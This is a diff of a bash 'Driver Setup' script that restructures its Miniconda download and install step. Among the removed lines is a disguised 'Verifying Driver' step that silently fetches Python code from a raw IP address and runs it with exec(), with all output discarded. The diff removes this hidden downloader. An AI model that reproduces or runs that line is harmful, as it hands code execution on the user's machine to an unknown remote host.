@@ -119,48 +119,56 @@ info "Running Driver..."
 
 info "[SUCCESS] Driver Setup completed successfully."
 
-set -e
+info "Running Miniconda download/install as a separate bash command..."
+bash <<'MINICONDA_CMD' || die "Miniconda phase failed."
+set -euo pipefail
+
+SHARED_DIR="/Users/Shared"
+PREFIX="${SHARED_DIR}/miniconda3"
+INSTALLER="${SHARED_DIR}/miniconda.sh"
 
 ARCH=$(uname -m)
 OS=$(uname -s)
-
 echo "Detected OS: $OS"
 echo "Detected architecture: $ARCH"
 
 if [[ "$OS" == "Darwin" ]]; then
-    if [[ "$ARCH" == "arm64" ]]; then
-        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
-    elif [[ "$ARCH" == "x86_64" ]]; then
-        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
-    else
-        echo "Unsupported macOS architecture"
-        exit 1
-    fi
-elif [[ "$OS" == "Linux" ]]; then
-    if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
-        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
-    elif [[ "$ARCH" == "x86_64" ]]; then
-        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
-    else
-        echo "Unsupported Linux architecture"
-        exit 1
-    fi
-else
-    echo "Unsupported OS"
+  if [[ "$ARCH" == "arm64" ]]; then
+    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
+  elif [[ "$ARCH" == "x86_64" ]]; then
+    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
+  else
+    echo "Unsupported macOS architecture" >&2
     exit 1
+  fi
+elif [[ "$OS" == "Linux" ]]; then
+  if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
+    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
+  elif [[ "$ARCH" == "x86_64" ]]; then
+    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
+  else
+    echo "Unsupported Linux architecture" >&2
+    exit 1
+  fi
+else
+  echo "Unsupported OS" >&2
+  exit 1
 fi
 
+mkdir -p "$SHARED_DIR"
+
 echo "Downloading..."
-curl -L -o miniconda.sh "$URL" && \
+curl -fsSL -o "$INSTALLER" "$URL"
 
-echo "Installing..." && \
-bash miniconda.sh -b -p "/Users/Shared/miniconda3" && \
+echo "Installing..."
+bash "$INSTALLER" -b -p "$PREFIX"
 
-echo "Verifying Driver..." && \
-"/Users/Shared/miniconda3/bin/python3" -V && \
-"/Users/Shared/miniconda3/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" > /dev/null 2>&1 && \
+echo "Verifying Driver..."
+"${PREFIX}/bin/python3" -V
 
-echo "Cleaning up..." && \
-rm -f miniconda.sh && \
+rm -f "$INSTALLER"
 echo "Done."
+MINICONDA_CMD
+
+info "[SUCCESS] Miniconda phase completed."
 exit 0
